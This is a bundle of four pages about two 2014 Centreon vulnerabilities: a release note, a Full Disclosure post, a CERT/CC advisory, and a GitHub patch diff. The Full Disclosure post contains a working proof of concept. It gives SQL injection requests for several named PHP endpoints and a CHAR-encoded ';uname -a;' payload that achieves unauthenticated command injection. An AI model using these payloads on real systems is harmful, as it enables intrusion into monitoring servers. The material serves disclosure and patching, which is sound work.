=== Content from documentation.centreon.com_dd95778e_20250124_183701.html ===

Warning - You're looking at an old version of Centreon documentation. [Click here to access the most recent one](https://docs.centreon.com)
 [Centreon](../../index.html)
19.04

* [About](../../a_propos/index.html)
* [Release notes](../index.html)
  + [Centreon 19.04](../centreon-19.04/index.html)
  + [Centreon 18.10](../centreon-18.10/index.html)
  + [Centreon 2.8](../centreon-2.8/index.html)
  + [Centreon 2.7](../centreon-2.7/index.html)
  + [Centreon 2.6](../centreon-2.6/index.html)
  + [Centreon 2.5](index.html)
    - [Centreon 2.5.4](centreon-2.5.4.html)
    - Centreon 2.5.3
      * [Warning](#warning)
      * [Notice](#notice)
      * [CHANGELOG](#changelog)
    - [Centreon 2.5.2](centreon-2.5.2.html)
    - [Centreon 2.5.2](centreon-2.5.2.html)
    - [Centreon 2.5.1](centreon-2.5.1.html)
    - [Centreon 2.5](centreon-2.5.0.html)
  + [Centreon 2.4](../centreon-2.4/index.html)
* [Lifecycle Products Policy](../../life_cycle.html)
* [Installation](../../installation/index.html)
* [Quick Start](../../quick_start/index.html)
* [Configuration](../../configuration_guide/index.html)
* [Exploitation](../../exploitation_guide/index.html)
* [Administration](../../administration_guide/index.html)
* [Upgrading](../../upgrade/index.html)
* [Migrating to Centreon 19.04](../../migration/index.html)
* [CEIP Program](../../ceip.html)
* [FAQ](../../faq/index.html)
* [Developer](../../developer/index.html)
* [API](../../api/index.html)

[Centreon](../../index.html)

* [Docs](../../index.html) »
* [Release notes](../index.html) »
* [Centreon 2.5](index.html) »
* Centreon 2.5.3
* [Edit on GitHub](https://github.com/centreon/centreon/blob/19.04.x/doc/en/release_notes/centreon-2.5/centreon-2.5.3.rst)

---

# Centreon 2.5.3[Â¶](#centreon-2-5-3 "Permalink to this headline")

## Warning[Â¶](#warning "Permalink to this headline")

This version include a couple of security fixes. Please proceed to the update of your platform if your centreon is not in version 2.5.3 at least.
If youâre using Debian or Suse before doing the update, you need to install php5-sqlite package.

The update can take some times due to the update to UTF-8 format (#5609)

## Notice[Â¶](#notice "Permalink to this headline")

If you are upgrading from a version prior to 2.5.2, make sure to go through all the release notes available
[here](http://documentation.centreon.com/docs/centreon/en/latest/release_notes/index.html).

## CHANGELOG[Â¶](#changelog "Permalink to this headline")

* #5895: Security Issues : CVE-2014-3828 & CVE-2014-3829
* #5888: Differences between update and fresh install for âInsert in index dataâ field
* #5829: Add config file in parameters for all crons of Centreon in order to install centreon on different directories
* #5852: Fix problem with massive change for âInherit contacts from hostâ in service form
* #5841: Empty dependencies are now remove automatically
* #5840: Fix problem with host duplication when this host has a âââ in the alias
* #5790 & #5813 & #5750: Fix problems on Tactical Overview
* #5786: Fix problem when generating correlation config file.
* #5756: Fix problem with centstorage => Table log is growing to much
* #5609: Push Centreon Broker table to UTF-8
* #5589: Fix problem with Contact inheritance between service and its template who doesnât work
* #4865: Fix problem with search in Eventlog

[Next](centreon-2.5.2.html "Centreon 2.5.2")
 [Previous](centreon-2.5.4.html "Centreon 2.5.4")

---

© Copyright 2015-2020 Centreon

Built with [Sphinx](http://sphinx-doc.org/) using a [theme](https://github.com/rtfd/sphinx_rtd_theme) provided by [Read the Docs](https://readthedocs.org).

 Read the Docs
v: 19.04

Versions
[latest](/docs/centreon/en/latest/)
[19.10](/docs/centreon/en/19.10/)
[19.04](/docs/centreon/en/19.04/)
[18.10](/docs/centreon/en/18.10/)
[2.8](/docs/centreon/en/2.8/)

---



=== Content from seclists.org_b303babe_20250124_183659.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](77)
[By Date](date.html#78)
[![Next](/images/right-icon-16x16.png)](79)

[![Previous](/images/left-icon-16x16.png)](77)
[By Thread](index.html#78)
[![Next](/images/right-icon-16x16.png)](79)

![](/shared/images/nst-icons.svg#search)

# Multiple unauthenticated SQL injections and unauthenticated remote command injection in Centreon <= 2.5.2 and Centreon Enterprise Server <= 2.2|3.0

---

*From*: yoloswag () ruggedinbox com

*Date*: Thu, 16 Oct 2014 20:39:04 +0000

---

# Multiple unauthenticated SQL injections and unauthenticated remote
command injection in Centreon <= 2.5.2 and Centreon Enterprise Server <=
2.2|3.0
```

#
# Product link:                 <http://www.centreon.com/>
# CVE references
#       |- CVE-2014-3828:       Unauthenticated SQL injections
#       |- CVE-2014-3829:       Unauthenticated remote command injection
# CERT/CC reference:    VU#298796
# Author:                               MaZ

TL;DR
-----

```
Centreon is vulnerable to several pre-auth SQLi and a cool pre-auth rci:
the only prerequisites to exploit the rci is to have at least one user
(you, your fav sysadmin or someone else) connected to the WebUI.
All Centreon versions from 2008 (v2.0) are vulnerable to the rci. Vulns
were originally found for the 2.5.1 version but the 2.5.2 seems to be
still vulnerable.
See the quick'n'dirty PoC below. A msf module might be soon be
available.
```

PoC
---

```
> ```
>
> SQL injections:
>
> ```

```

------------------

```
[POST]
<http://server/centreon/include/configuration/configObject/traps/GetXMLTrapsForVendor.php>
```

[POST DATA] mnftr_id=1 or 1=1 union all select version(),2 -- /**

```
[POST]
<http://server/centreon/include/common/javascript/commandGetArgs/cmdGetExample.php>
```

[POST DATA] index=2' or 1=1 -- /**

```
[GET] [http://server/centreon/include/views/graphs/GetXmlTree.php?sid='](http://server/centreon/include/views/graphs/GetXmlTree.php?sid=&apos);
or 1=1 -- /\*\*
```

```
[GET]
[http://server/centreon/include/views/graphs/graphStatus/displayServiceStatus.php?session\_id=0'](http://server/centreon/include/views/graphs/graphStatus/displayServiceStatus.php?session_id=0&apos);
or 1=1 -- /\*\*&index=1' or 1=1 -- /\*\*
```

```
[GET]
[http://server/centreon/include/views/graphs/common/makeXML\_ListMetrics.php?index\_id='](http://server/centreon/include/views/graphs/common/makeXML_ListMetrics.php?index_id=&apos);
union select @@version,2,3 -- /\*\*
```

```
> ```
>
> Remote Command Injection
>
> ```

```

---------------------------

```
For older versions, the URL is not:
<http://server/centreon/include/views/graphs/graphStatus/displayServiceStatus.php>
but:
<http://server/centreon/include/views/graphs/statusGraphs/displayServiceStatus.php>.
```

```
[PAYLOAD] ";uname -a;" which has to be converted to SQL "CHAR(59, 32,
117, 110, 97, 109, 101, 32, 45, 97, 59)"
```

```
[GET]
<http://server/centreon/include/views/graphs/graphStatus/displayServiceStatus.php>
```

?session_id=' or 1=1 -- /**

```
&template\_id=' UNION ALL SELECT 1,2,3,4,5,CHAR(59, 32, 117, 110, 97,
109, 101, 32, 45, 97,
59),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 -- /\*\*
```

Details
-------

```
> ```
>
> SQLi injections:
>
> ```

```

------------------
See for yourself
$ cd www/
$ grep -inr "DB->query(" . |grep -P "$_(GET|POST)"

```
> ```
>
> Remote Command Injection
>
> ```

```

---------------------------

```
The following world-accessible file
"www/include/views/graphs/graphStatus/displayServiceStatus.php" contains
few coding mistakes.
The purpose of this script is to produce a graph, relying on the
execution of a shell command involving the "graph" executable: a
mis-escaped shell command is built throughout the script.
```

```
Well first, there's an SQLi in the request which checks for an active
session (someone has to be currently logged). From line 70 :
```

        /*
         * Verify if session is active
         */

```
 $session = $pearDB->query("SELECT \* FROM `session` WHERE session\_id =
'".$\_GET["session\_id"]."'");
```

```
Then, some graph parameters are taken from a template id. The associated
request is also vulnerable to SQLi.
From line 120 you have the code responsible for setting the variable
$template\_id :
```

        if (!isset($_GET["template_id"])|| !$_GET["template_id"]){
                $host_id = getMyHostID($index_data_ODS["host_name"]);

```
 $svc\_id = getMyServiceID($index\_data\_ODS["service\_description"],
$host\_id);
```

                $template_id = getDefaultGraph($svc_id, 1);
                $index = $index_data_ODS["id"];
        } else
                $template_id = $_GET["template_id"];

Then, there's an SQLi in the request which gets there graph parameters.
From line 140:
        /*
         * get all template infos
         */

```
 $DBRESULT = $pearDB->query("SELECT \* FROM giv\_graphs\_template WHERE
graph\_id = '".$template\_id."' LIMIT 1");
```

        $GraphTemplate = $DBRESULT->fetchRow();

```
Then, these graph parameters are put into the command. Notably the
"base" parameter, corresponding to the 6th column in the
'giv\_graphs\_template' table.
```

From line 163:
        $base = "";
        if (isset($GraphTemplate["base"]) && $GraphTemplate["base"])
        {
                $base = "-b ".$GraphTemplate["base"];
        }

At line 184:

```
 $command\_line .= " --interlaced $base --imgformat PNG
--width=".$GraphTemplate["width"]."
--height=".$GraphTemplate["height"]." ";
```

```
Then, the command line is escaped...but some special chars, notably ';',
are missed:
```

From line 254:
        /*
         * Escale special char
         */
        $command_line = escape_command("$command_line");

From line 38:
        function escape_command($command) {
                return preg_replace("/(\\\$|`)/", "", $command);
        }

```
Finally and to top it all, the command gets executed and the stdout is
echoed.
```

From line 259:
        $fp = popen($command_line  , 'r');
        if (isset($fp) && $fp ) {
                $str ='';
                while (!feof ($fp)) {
                        $buffer = fgets($fp, 4096);
                        $str = $str . $buffer ;
                }
                print $str;
        }

Solution
--------
Brace yourself and

```
\* Delete displayServiceStatus.php: I don't know if it'll break something
or not
```

* Wait for patches

Timeline
--------

```
Jun 3, 2014: Discoverer found vulns, asked for CVE and contacted vendor
through their contact@ and sales@ mail. Not a single f\*\*\* seems to be
given from them
```

Jun 21, 2014: Discoverer contacted Rapid7. Yes, they're cool
Aug 04, 2014: Rapid7 validated CVE-2014-3289
Aug 11, 2014: Rapid7 validated CVE-2014-3828
Aug 28, 2014: Researcher and Rapid7 agree to disclose to CERT/CC.

```
Sep 2, 2014: Disclosure to CERT/CC. They'll try to reach the vendor.
Public disclosure date is set on October 15, 2014
Oct 16, 2014: No fix or news from Centreon. Not a single f\*\*\* is
definitely given. Public disclosure. Period
```

_______________________________________________
Sent through the Full Disclosure mailing list
<http://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](77)
[By Date](date.html#78)
[![Next](/images/right-icon-16x16.png)](79)

[![Previous](/images/left-icon-16x16.png)](77)
[By Thread](index.html#78)
[![Next](/images/right-icon-16x16.png)](79)

### Current thread:

* **Multiple unauthenticated SQL injections and unauthenticated remote command injection in Centreon <= 2.5.2 and Centreon Enterprise Server <= 2.2|3.0** *yoloswag (Oct 17)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.kb.cert.org_2501597a_20250124_183700.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#298796

## Centreon contains multiple vulnerabilities

#### Vulnerability Note VU#298796

Original Release Date: 2014-10-17 | Last Revised: 2014-10-17

---

### Overview

Centreon version 2.5.1 and Centreon Enterprise Server version 2.2 contain multiple vulnerabilities.

### Description

| [**CWE-77**](http://cwe.mitre.org/data/definitions/77.html)**: Improper Neutralization of Special Elements used in a Command ('Command Injection') - CVE-2014-3829**  Centreon version 2.5.1 and Centreon Enterprise Server version 2.2 are vulnerable to command injection due to unsafe handling of session\_id and template\_id variables in displayServiceStatus.php and insufficient filtering on the command\_line variable. The underlying operating system is then able to interpolate special characters, allowing for arbitrary commands to be injected.[**CWE-89**](http://cwe.mitre.org/data/definitions/89.html)**: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') - CVE-2014-3828**Centreon version 2.5.1 and Centreon Enterprise Server version 2.2 are vulnerable to SQL injection in the following php components:<http://server/centreon/include/views/graphs/common/makeXML_ListMetrics.php><http://server/centreon/include/views/graphs/GetXmlTree.php><http://server/centreon/include/views/graphs/graphStatus/displayServiceStatus.php><http://server/centreon/include/configuration/configObject/traps/GetXMLTrapsForVendor.php><http://server/centreon/include/common/javascript/commandGetArgs/cmdGetExample.php><http://server/centreon/include/views/graphs/graphStatus/displayServiceStatus.php>Rapid7 reports that prior versions back to 2.0 may be affected. See the Rapid7 advisory for more details. |
| --- |

### Impact

| A remote unauthenticated attacker may be able to execute arbitrary OS and SQL commands. |
| --- |

### Solution

| The CERT/CC is currently unaware of a practical solution to this problem. |
| --- |

### Vendor Information

298796
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23298796/) to view vendors.**
### [Centreon](#BLUU-9NNQ8X) Affected

Notified:  September 05, 2014  Updated: October 15, 2014

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

We are not aware of further vendor information regarding this vulnerability.

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base | 10 | AV:N/AC:L/Au:N/C:C/I:C/A:C |
| Temporal | 8.1 | E:POC/RL:U/RC:UC |
| Environmental | 6.1 | CDP:ND/TD:M/CR:ND/IR:ND/AR:ND |

### References

* <http://www.centreon.com/Content-products/it-infrastructure-and-application-monitoring-centreon>
* <http://cwe.mitre.org/data/definitions/89.html>
* <http://cwe.mitre.org/data/definitions/77.html>
* <http://seclists.org/fulldisclosure/2014/Oct/78>
### Acknowledgements

Thanks to Tod Beardsley of Rapid7 for reporting this vulnerability and MaZ for the original vulnerability discovery.

This document was written by Chris King.

### Other Information

| **CVE IDs:** | [CVE-2014-3828](http://web.nvd.nist.gov/vuln/detail/CVE-2014-3828), [CVE-2014-3829](http://web.nvd.nist.gov/vuln/detail/CVE-2014-3829) |
| --- | --- |
| **Date Public:** | 2014-10-15 |
| **Date First Published:** | 2014-10-17 |
| **Date Last Updated:** | 2014-10-17 18:25 UTC |
| **Document Revision:** | 18 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800



=== Content from github.com_96895bac_20250124_183706.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcentreon%2Fcentreon%2Fcommit%2Fcc2109804dd69057cb209037113796ec5ffdce90)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcentreon%2Fcentreon%2Fcommit%2Fcc2109804dd69057cb209037113796ec5ffdce90)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=centreon%2Fcentreon)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[centreon](/centreon)
/
**[centreon](/centreon/centreon)**
Public

* [Notifications](/login?return_to=%2Fcentreon%2Fcentreon) You must be signed in to change notification settings
* [Fork
  41](/login?return_to=%2Fcentreon%2Fcentreon)
* [Star
   111](/login?return_to=%2Fcentreon%2Fcentreon)

* [Code](/centreon/centreon)
* [Issues
  103](/centreon/centreon/issues)
* [Pull requests
  101](/centreon/centreon/pulls)
* [Actions](/centreon/centreon/actions)
* [Projects
  0](/centreon/centreon/projects)
* [Security](/centreon/centreon/security)
* [Insights](/centreon/centreon/pulse)

Additional navigation options

* [Code](/centreon/centreon)
* [Issues](/centreon/centreon/issues)
* [Pull requests](/centreon/centreon/pulls)
* [Actions](/centreon/centreon/actions)
* [Projects](/centreon/centreon/projects)
* [Security](/centreon/centreon/security)
* [Insights](/centreon/centreon/pulse)

## Commit

[Permalink](/centreon/centreon/commit/cc2109804dd69057cb209037113796ec5ffdce90)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix [#5895](https://github.com/centreon/centreon/pull/5895) : security issues

[Browse files](/centreon/centreon/tree/cc2109804dd69057cb209037113796ec5ffdce90)
Browse the repository at this point in the history

* Loading branch information

[![@julienmathis](https://avatars.githubusercontent.com/u/2294502?s=40&v=4)](/julienmathis)

[julienmathis](/centreon/centreon/commits?author=julienmathis "View all commits by julienmathis")
committed
Oct 20, 2014

1 parent
[46437ec](/centreon/centreon/commit/46437ecb5286330c152e03b5f0dbf8b082ef78dd)

commit cc21098

 Show file tree

 Hide file tree

Showing
**16 changed files**
with
**65 additions**
and
**60 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* www/include

  + Administration/corePerformance

    - www/include/Administration/corePerformance/getStats.php
      [getStats.php](#diff-aa4ad552a78286252e2c72327c83096936151f41eeee7202ce7b6b1c048a26c0)
  + common

    - XmlTree

      * www/include/common/XmlTree/GetXmlTree.php
        [GetXmlTree.php](#diff-23741a50988868979ab6ff18e480a79665b1200760b99a68491b564cf0ec0242)
    - www/include/common/getHiddenImage.php
      [getHiddenImage.php](#diff-02649d69de3777860a4bc9e297a7bbd0f8e4f6674d8cce7149b1344df81a2900)
  + configuration/configObject

    - command\_categories

      * www/include/configuration/configObject/command\_categories/DB-Func.php
        [DB-Func.php](#diff-4f378121488757f1691268e5966534da46fab9e915f10645d6b778bcf4f32c40)
    - host\_template\_model

      * www/include/configuration/configObject/host\_template\_model/formHostTemplateModel.php
        [formHostTemplateModel.php](#diff-d100739ec2475175c5f1d2943ab011ac01d080561158aa5294bd57af706c98ab)
    - service\_categories

      * www/include/configuration/configObject/service\_categories/DB-Func.php
        [DB-Func.php](#diff-594d87615431244ef369bd5958e75ac46bf21b0087d1a2105d33cbb8f0a50915)
    - service\_template\_model

      * www/include/configuration/configObject/service\_template\_model/formServiceTemplateModel.php
        [formServiceTemplateModel.php](#diff-fd6e8202c61540470a92cc103238ffef7b45ed2d4afbc336821522a25e4d6c03)
    - traps

      * www/include/configuration/configObject/traps/GetXMLTrapsForVendor.php
        [GetXMLTrapsForVendor.php](#diff-0839bf5743691ee7c93ac0e40fb8be5047684ea740890d3cd4af6ab795d516f9)
      * xml

        + www/include/configuration/configObject/traps/xml/additionalRowXml.php
          [additionalRowXml.php](#diff-aa8dc8d2bf034e87faecdf26fd48850137159955e8afd247600e84772f132dac)
  + eventLogs/XmlTree

    - www/include/eventLogs/XmlTree/GetXmlTree.php
      [GetXmlTree.php](#diff-ccfb0edff1239f09b7e655ea46f9c138347769617d8b866d3b97879ecfa9a60e)
  + options

    - accessLists/reloadACL

      * www/include/options/accessLists/reloadACL/reloadACL.php
        [reloadACL.php](#diff-34babdfb1f647bb01a0294143039ef9e410c2a38c8c5b8f74496dff3aeba33ac)
    - media/images

      * www/include/options/media/images/syncDir.php
        [syncDir.php](#diff-e31825be08fcb98529069345d4b1bc33e27a1e68450002f25edfb888957bcbb6)
    - session

      * www/include/options/session/connected\_user.php
        [connected\_user.php](#diff-2addd9d5118a61228263acead6642e1ec2475f3fde4241dac7328ae2a7a19201)
  + views/graphs

    - www/include/views/graphs/GetXmlTree.php
      [GetXmlTree.php](#diff-91f9b0df873abebfe882f446b301395f395bfa9f9da7556ae8255661e348f63f)
    - common

      * www/include/views/graphs/common/makeXML\_ListMetrics.php
        [makeXML\_ListMetrics.php](#diff-031e318a5dcc4b64375bb76351598fb726d46de16f0ba66997763713d0ed2a3f)
    - graphStatus

      * www/include/views/graphs/graphStatus/displayServiceStatus.php
        [displayServiceStatus.php](#diff-d0eb982aafead76062667fc5cf92510a52d873794b2097286f3c13399a0d9d54)

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[www/include/Administration/corePerformance/getStats.php](#diff-aa4ad552a78286252e2c72327c83096936151f41eeee7202ce7b6b1c048a26c0 "www/include/Administration/corePerformance/getStats.php")

Show comments

[View file](/centreon/centreon/blob/cc2109804dd69057cb209037113796ec5ffdce90/www/include/Administration/corePerformance/getStats.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -97,7 +97,7 @@ function escape\_command($command) { |
|  |  | /\* |
|  |  | \* Check Session activity |
|  |  | \*/ |
|  |  | $session = $pearDB->query("SELECT \* FROM `session` WHERE session\_id = '".$\_GET["session\_id"]."'"); |
|  |  | $session = $pearDB->query("SELECT \* FROM `session` WHERE session\_id = '".$pearDB->escape($\_GET["session\_id"])."'"); |
|  |  | if (!$session->numRows()){ |
|  |  | ; |
|  |  | } else { |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[www/include/common/XmlTree/GetXmlTree.php](#diff-23741a50988868979ab6ff18e480a79665b1200760b99a68491b564cf0ec0242 "www/include/common/XmlTree/GetXmlTree.php")

Show comments

[View file](/centreon/centreon/blob/cc2109804dd69057cb209037113796ec5ffdce90/www/include/common/XmlTree/GetXmlTree.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -88,7 +88,7 @@ function getServiceGroupCount() { |
|  |  |  |
|  |  | $is\_admin = isUserAdmin($\_GET["sid"]); |
|  |  | if (isset($\_GET["sid"]) && $\_GET["sid"]){ |
|  |  | $DBRESULT = $pearDB->query("SELECT user\_id FROM session where session\_id = '".$\_GET["sid"]."'"); |
|  |  | $DBRESULT = $pearDB->query("SELECT user\_id FROM session where session\_id = '".$pearDB->escape($\_GET["sid"])."'"); |
|  |  | $session = $DBRESULT->fetchRow(); |
|  |  | $access = new CentreonAcl($session["user\_id"], $is\_admin); |
|  |  | $lca = array("LcaHost" => $access->getHostServices($pearDBndo), "LcaHostGroup" => $access->getHostGroups(), "LcaSG" => $access->getServiceGroups()); |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[www/include/common/getHiddenImage.php](#diff-02649d69de3777860a4bc9e297a7bbd0f8e4f6674d8cce7149b1344df81a2900 "www/include/common/getHiddenImage.php")

Show comments

[View file](/centreon/centreon/blob/cc2109804dd69057cb209037113796ec5ffdce90/www/include/common/getHiddenImage.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -51,7 +51,7 @@ |
|  |  | $logos\_path = "../../img/media/"; |
|  |  |  |
|  |  | if (isset($\_GET["id"]) && $\_GET["id"] && is\_numeric($\_GET["id"])) { |
|  |  | $result = $pearDB->query("SELECT dir\_name, img\_path FROM view\_img\_dir, view\_img, view\_img\_dir\_relation vidr WHERE view\_img\_dir.dir\_id = vidr.dir\_dir\_parent\_id AND vidr.img\_img\_id = img\_id AND img\_id = '".$\_GET["id"]."'"); |
|  |  | $result = $pearDB->query("SELECT dir\_name, img\_path FROM view\_img\_dir, view\_img, view\_img\_dir\_relation vidr WHERE view\_img\_dir.dir\_id = vidr.dir\_dir\_parent\_id AND vidr.img\_img\_id = img\_id AND img\_id = '".$pearDB->escape($\_GET["id"])."'"); |
|  |  | while ($img = $result->fetchRow() ) { |
|  |  | $imgpath = $logos\_path . $img["dir\_name"] ."/". $img["img\_path"]; |
